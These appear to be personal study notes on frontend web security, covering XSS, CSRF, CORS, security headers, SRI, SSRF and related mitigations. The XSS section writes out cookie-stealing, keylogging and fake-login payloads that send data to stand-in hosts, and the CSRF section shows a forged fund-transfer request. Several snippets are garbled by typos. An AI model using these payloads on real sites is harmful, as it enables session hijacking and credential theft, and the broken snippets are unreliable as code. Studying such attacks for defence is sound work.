1. XSS -cross site scripting
1. CSRF -
1. Authentication/Authorisation
1. Input Validation
1. Sanitisation related input
1. HTTPS
1. Security Headers
1. Iframe Protection
1. Dependency Injection
1. Client Storage Security
1. Compliance and regulations
1. SSRF
1. SSJI
1. Feature Flag
1. Subresource Integrity
1. CORS
1. CSRF
---------------------------------------------------------------------------------------

## XSS
Cross Site Scripting

![](https://websitesecuritystore.com/wp-content/uploads/2021/07/cross-site-scripting-examples.svg)
[medium](https://medium.com/@varsharanijnv16122001/xss-attack-cd7a1a52c25b)

Vulnerabilities & Mitigations
1. User session hijacking
1. Unauthorised activities
1. Capturing keystrokes
1. Stealing critical information
1. Phishing Attack

Mitigation
- List all possible way to take user input
- innerHTML try avoiding use of innerHTML use innerTEXT or textContent
- Use Escaping user input like / \ ? with encoded values
- Using Library like React
- Sanitize with DOMPurify 
- CSP Headers
- Avoid using eval 

* injection --> ?name=<img src=\"does-not-exist\" onerror=\"var img=socument.createElement"; img.src=`http://127.0.0.1:5501/cookie?data=${document.cookie}`; document.querySelector{\'body\').appendChild(img);\">

* attackers end point `http://127.0.0.1:5501/cookie?data=${document.cookie}`; 

* UNAUTHORIZED ACCESS
suppose we have utility function where we take title and description you can trigger this function
?name=<img src="error.gif" onerror="createPost('HACK_TITLE', 'HACK_DESCRIPTION');"/>

* Capturing keystrokes- all the keystrokes are captured
`var timeout;
var buffer=";
document.querySelector('body`).addEventListener('keypress', function(event){
if (event.which !==0){
clearTimeout9timeout);
buffer +=String.fromCharCode(event.which);
timeout = setTimeout(function(){
var xhr = new XMLHttpRequest();
var uri = `http://localhost:3001/keys?data=` + encodeURIComponent(buffer);
xhr.open('GET, uri);
xor.send();
buffer=";
}, 400);}});`

* Stealing the critical information
<img src="empty.gif" onerror="var mycookie=document.document.cookie;
new Image().src=`https://example.com/fakepage.php?output=${document.body.innerHTML}`;"/>
* Phishing attack - data from fake form
encodeURIComponent(`<h3> Please login to proceed </h3> <form action=http://example.com/fakepage.php>Username:<br><input type="username" name="username"></br><input type="password" name="password"></br><br><input type="submit" value="Login"></br>')

* CSP (Content Security Policy)
-> Allowed Sources
-> Script Nonces
-> Report-only mode
---------------------------------------------------------------------------------------

## iFrame Protection
* Vulnerability
* Click hijacking
* Data theft via javascript
* Session and cookie theft

### Mitigations
* X-Frame options DENY
* frame-ancestors 'self' setting CSP header
* use sandbox iframe
* set cookies like 
httpOnly: true,
secure: true,
sameSite: 'Strict'
---------------------------------------------------------------------------------------

## Security Headers

1. X-Powered-By
1. Referrer policy
1. X-Content-Type-Options
1. X-XXS-Protection
1. Strict-Transport-Security !(https://medium.com/@alysachan830/cookie-and-session-i-the-basic-concept-fea3d52bc8d3)
![HSTS](https://cdn.acunetix.com/wp_content/uploads/2019/05/hsts.png)
---------------------------------------------------------------------------------------

## Client Storage Security
1. Storing sensitive data on client storage :
*  Try storing at store
*  encrypt data 
[encrypt data](https://apurvupadhyay.medium.com/top-ways-to-implement-encryption-in-javascript-5af247abcebe)
*  set token expiry

1. Authentication
* JWT/OAuth
* token expiry should be defined
* Multi factor authentication

1. Data Integrity
*  checksum

1. Storage
* 5-10MB can be stored on client LocalStorage
* SessionStorage 5-10MB
* IndexedDB 50-100 MB
* Cookie 4KB -20KB
* Cache ~ 100MB

1. Session Management
`Store session ID in a cookie with HTTP only flag
const sessionId = 'abcdef13456`;
document.cookie = `sessionId=$sessionId}; HttpOnly;Secure`;

//On the server-side, associate session ID with user data
const sessionDaata = getSessionData(sessionId);`
---------------------------------------------------------------------------------------

## Secure Communication (HTTPS)
1. Data Encryption (TLS)
1. Authentication (SSL & TLS)
1. Data Integrity (MAC)
1. Protection Against Phishing 
1. Data Privacy 
1. Compliance with Security Standardds
1. Trust and Reputations
1. Search Engine Ranking - https has more rank
1. Protection Against Browser Warnings - you get the screen do you want to continue the website isn't secure
1. Faster website loading to use - HTTP2 you need to use HTTPS
---------------------------------------------------------------------------------------

## Dependency Security
1. Regular Audit of dependencies
(npm audit, npm update)

1. Enforce auditing
(npm set audit true)

1. Code and Dependency monitoring
* codeql
* Dependantbot - tells outdated dependencies, anything that's unsecured

1. Dependency locking
(package-lock.json)

1. Security Penetration testing using tools
* AppScanner
* Burp Suite
* Zed Attack Policy
---------------------------------------------------------------------------------------

## Compliance and Regulation
GDPR violations
Data protection laws
Learning outcomes:
Understand fundamental concepts related to user privacy:
Personally identifiable information (PII).
Confidentiality.
Tracking.
Fingerprinting.
Be aware of regional privacy laws, for example:
[General Data Protection Regulation (GDPR)](https://eur-lex.europa.eu/legal-content/EN/TXT/HTML/?uri=CELEX:32016R0679&from=EN) (EU).
[Data Protection Act 2018](https://www.gov.uk/data-protection) (UK), gov.uk.
[California Consumer Privacy Act (2018)](https://www.oag.ca.gov/privacy/ccpa) (US, CA), ca.gov.
[Children's Online Privacy Protection Rule (COPPA)](https://www.ftc.gov/legal-library/browse/rules/childrens-online-privacy-protection-rule-coppa) (US), ftc.gov.
---------------------------------------------------------------------------------------

## Input Validation and Sanitization

* - Use framework library
* - Whitelist validation
* - Regular expressions
* - Escape user input
* - Parameterised URLs
* - Validate Data types
* - Length & Size check while taking input
* - Images and files you take 9extensions)
* - Add client side validation even if there's server side validation
* - Error Handling
* - Don't miss the security headers
* - Regular updates and patches take them
* - Security audits and testing
* - Avoid using Third-party libraries
---------------------------------------------------------------------------------------

## Server-Side Request Forgery (SSRF)

access to server and talking to internal network
![](https://res.cloudinary.com/snyk/image/upload/v1638263093/snyk-learn/SSRF_Attack.svg)
* Lack of whitelisting
* Insufficient access control
node-fetch, axios libraries gives avoids such vulnerability
* XML External Entity (XEE)
There should be proper deserialization
---------------------------------------------------------------------------------------

## Server-Side Javascript Injection (SSJI)

* Inadequate input validation
* Direct execution of user provided code
* using dangerous
* insecure desrialization
---------------------------------------------------------------------------------------

## Feature Policy and Protection Policy

[Playground](https://permissions-policy-demo.glitch.me/demo/)
![](https://developer.chrome.com/static/docs/privacy-security/permissions-policy/image/quick-overview-diagram-p-97d11e15447b5.png)
---------------------------------------------------------------------------------------

## Subresource Integrity (SRI)

![SRI](https://beautifycode.net/images/cdn-sri.png)

* Use of integrity
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.5/dist/css/bootstrap.min.css" rel="stylesheet" **integrity="sha384-SgOJa3DmI69IUzQ2PVdRZhwQ+dy64/BUtbMJw1MZ8t5HZApcHrRKUc4W0kG879m7"** crossorigin="anonymous">
* Benefits 👍
- 3rd party resource is compromised
---------------------------------------------------------------------------------------

## Cross origin resource sharing (CORS)

![CORS](https://bunnyacademy.b-cdn.net/gTIGO-How-do-Cross-Origin-Resource-Sharing-CORS-Headers-work.png)

* SOP - same origin policy
* Cross Origin Request (different - protocol, port, subdomain, domain)
* CORS Headers
1. Access-control-allow-origin
1. Access-control-allow-methods
1. Access-control-allow-headers
1. Access-control-allow-credentials
1. Access-control-expose-headers

![CORS](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQokJ_1p8g2ttU_E4dXu1eCrw-Pop2h4SCRzg&s)

use npm core
---------------------------------------------------------------------------------------

Cross -site request forging (CSRF)
[CSRF](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTPN_eoP0RyULE7_tlAonHh-Sb2UwiRW-OA3w&s)

Reasons 
* Statelessness of HTTP
* User authentication the information from cookies can be manipulated and server can execute it without knowing it is not from its own website

Vunerabilities
* Get API call to update data or perform action
if url is already logged in on the website 

//GET request
http://bank.com/funtransfer?accId=21312&amount=10000
<a href="/>Offer Clime Me! </a>

<img src=""/>

<form action="" method="POST">
  <input type="hidden" name="accId" value="123123"/>
  <input type="hidden" name="amount" value="123123"/>
  <input type="submit" value="Click for offer"/>
</form>

* Mitigation
1. Anti-CSRF token --> using token only response
 [CSRF token](https://miro.medium.com/v2/resize:fit:1400/1*RtaGZC2IxTsIHgqW21udBw.png)

1. SameSite Cookies
setHeader('Set-Cookie', 'SameSite=Strict (doesn't allow even if its different domain , subdomain) /Lax (allows cross site)/ None (its open to anything); Secure');

1. Always check referer -if it comes from own site allow. if not throw error.
1. Use Captcha
1. Use CSP headers

Don't allow browsers to remember the passwords
Please don't use /get to update info.
